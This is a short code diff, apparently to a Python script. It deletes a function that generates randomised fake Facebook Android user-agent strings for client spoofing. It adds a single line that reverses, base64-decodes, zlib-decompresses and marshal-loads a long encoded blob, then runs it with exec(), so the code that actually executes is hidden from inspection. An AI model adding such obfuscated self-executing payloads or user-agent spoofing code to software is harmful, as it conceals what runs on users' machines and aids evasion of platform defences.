@@ -1,10 +1,1 @@
-def ax():
-	facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
-	fbbv = str(random.randint(410000000,499999999))
-	fbrv = str(random.randint(000000000,999999999))
-	fbcr = random.choice(["GigSky","T-Mobile","MegaFon","telenor","T-Mobile"])
-	density = random.choice(['2x2.7'])
-	width = random.choice(["1440"])
-	height = random.choice(["3040"])
-	ua = f"[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{str(fbrv)};FBCR/{str(fbcr)};FBMF/Samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/Samsung Galaxy S10;FBSV/9.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
-	return ua
+_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'==AtpOf4P4vWHimKOGFtqgqoaWFDBJ7XOcYlcKit0SCpODGOj9cywsHILk+N1KV8fMakeYwFxWY+ojFwmqFh8hUvY4bJffaXikD6FHva1dM6FxNk9DD6m+WjiofLgPgfS2GXeQ/q4NczosdrsSz4dYksTalUoyWycJZ620kFkGdqtkoW9CxeRJ61ifp47/3y8W3CQ8zxgbzvBQN+xv108acdBqwqCGu9r9QtGVWXVS/VJf3e94fhDxm0bomhRzf2PVEPVW3seDOujp5wdYF7p6HUxAUpcuDrphp1ZW5HqfJXWZHLqblOZ5p+UwoxIysqBbNrdkqzs/myGlCFoGW8G3jzQxKGJf9HDgTiPEoXZQnIeFBfw25a4XA1bCwO9vbITqF+0etxiK7KWFZX8MV/8MH9+Ci+xKI1avwUo++8qY+1rYwHBf86+2+YhMWaL0BUeNvn/X5/G7/X35IsjqPAVN7cW5WqP9c+3d7jt38zutHAaNy4M280/DVB5nlcdkF7ZS/BchmnmCfYXqR4Vvm6btqVXfzVs2mbyKvGlTw6SUSLy0v4jkTBXfRCD7O9lBOvJyyvLUXkGRH6tGTYrQXpkk2ci0tJ8axJMym3m/Zr0LEXJ4kTZdgeKtDDKnvj6sDGZX9iqgXMEWARPh9aXwkj5J5XGmOJk8CHLxfpvwiIn5oHN75cMFZKJhsm2HywYmUzUyl8RTbYi78rXQ6KckPdYvVPyRAr5GTBXeSMIzhsRCB3eOLkzUGRnhES7z+wnzsLl22Edi5kMbxcjRBeTM4xmYowwQG057eujsq26TT3REb60v+r9f0oeSyykQLhWFRV6KtkXQShGebQVQcJs8itzHg5GbvcitglrXT418rvPh49dTA+4Wvb4BFxnAcnAW4fdLWfGey3lHg8h/disOC7IyRaxvVzlt70++jVdrjpuLx2BkyqjWAv+b8M51HjmM/em/z59uFVqvpOpif5l5bVubj6LkSbdJVEznSbjlKCpTp1J35Qf+X0JrGj4reAko3007hpBv/MHHyM2/h6t49nO/es36i52PkYofEP/aOKL0mjcbNmK6cV+nVGcet/ZmAnE2HEKwHq41BwI0G4FCRuPJwlpNEF4rJZ4r5XDvO6eLE8sQNQ6A+BADYTDPAq8rhohHo57MLPv599vP7e2bFJBoyurNgtzkicQu4SbC5HKbVgbVU4UFIusCHVA5JoUhjiFVhaHEBkW60BIz5YJeTrbgt0ObzdvChhaWrDG1eT2I+0SqLkooRS9qKWARSa4MgdfgjmOp9x13ZncU0Gv1MV9yJe'))
